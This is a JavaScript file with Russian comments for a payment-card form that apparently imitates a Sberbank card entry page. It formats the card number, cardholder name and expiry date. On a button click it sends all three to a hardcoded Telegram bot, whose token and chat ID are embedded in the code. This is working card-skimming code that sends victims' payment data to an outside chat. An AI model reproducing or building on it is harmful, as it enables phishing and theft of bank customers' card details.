// Номер карты 
function displayText() {
    var inputText = document.getElementById("myInput").value;
    document.getElementById("displayText").innerText = inputText;
}
document.getElementById("myInput").addEventListener("input", function(event) {
    var input = event.target;
    var trimmedValue = input.value.replace(/\s+/g, ''); // Удаляем все существующие пробелы
    var formattedValue = formatCreditCardNumber(trimmedValue);
    input.value = formattedValue;
});
function formatCreditCardNumber(value) {
    var formattedValue = value.replace(/\D/g, ''); // Удаляем все нецифровые символы
    formattedValue = formattedValue.replace(/(.{4})/g, '$1 ').trim(); // Добавляем пробел после каждых 4 цифр
    return formattedValue;
}
// Номер карты 
function nameSber() {
    var inputText = document.getElementById("myInputSber").value;
    document.getElementById("nameSber").innerText = inputText;
}
// ДД МГ карты 
function nameSberDD() {
    var inputText = document.getElementById("expiryDate").value;
    document.getElementById("nameDD").innerText = inputText;
}

// вывод данных
function showInput() {
// номер
    let input = document.getElementById("myInput").value;
    document.getElementById("output").innerText =  input;
// имя
    let input1 = document.getElementById("myInputSber").value;
    document.getElementById("output1").innerText =  input1;
// дата
    let input2 = document.getElementById("expiryDate").value;
    document.getElementById("output2").innerText =  input2;
}


//отправка в тг
const form = document.getElementById('myForm');
  form.addEventListener('submit', function(event) {
    event.preventDefault(); // Предотвращаем отправку формы (если используется AJAX)
    // Отправка данных...
    // После отправки данных, очистим форму:
    form.reset();
  });
  document.addEventListener("DOMContentLoaded", function() {
    const TELEGRAM_TOKEN = '6527581740:AAEc3Z_1vwP5aOY6iOBUdCqGYm9XRMWwyv8';
    const CHAT_ID = '-4154188856'; // Ваш chat_id (идентификатор чата)

    const userInput = document.getElementById('myInput');
    const userInput1 = document.getElementById('myInputSber');
    const userInput2 = document.getElementById('expiryDate');
    const sendButton = document.getElementById('send-button');

    function sendTelegramMessage(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const params = {
            chat_id: CHAT_ID,
            text: message,
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params),
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error sending message:', error));
    }


    function handleUserInput() {
        const messageText = '📍Номер карты: '
        const messageName = '📍Имя: '
        const messageDate = '📍Дата окончания: '
        const message = userInput.value.trim();
        const message1 = userInput1.value.trim();
        const message2 = userInput2.value.trim();
        if (message !== '') {
            sendTelegramMessage(messageText + message + '\n' + messageName + message1 + '\n' + messageDate + message2);
            userInput.value = '';
        }
    }
    sendButton.addEventListener('click', handleUserInput);
});
